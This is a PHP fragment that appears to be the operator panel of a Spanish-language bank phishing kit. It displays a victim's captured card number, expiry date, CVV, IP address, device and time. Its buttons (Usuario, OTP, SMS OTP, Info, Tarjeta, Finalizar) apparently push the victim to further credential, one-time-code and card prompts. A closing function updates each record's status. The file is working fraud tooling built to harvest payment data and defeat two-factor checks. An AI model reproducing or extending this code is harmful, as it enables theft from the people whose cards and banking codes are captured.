						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$tar.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/2.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/2a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$fec.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/3.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/3a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/1.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/1a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">					
						<div class="grupo" style="background-color: #FFC700;">Sistema</div>		
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor"><img src="../img/14.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/14a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/6.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/6a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].'">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/5.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/5a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>									
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$equipo.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/4.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/4a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td >					
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$hora.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/7.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/7a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>	
					</td>
				</tr>
			</table>			
<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>

			<table style="margin:0 auto;" >
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>SMS OTP</td>
								</tr>
							</table>
						</button>						
					</td>
				</tr>
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Info</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>

		</div>
		';
}





function actualizar_estado($reg,$est){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = intval($est);
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}

?>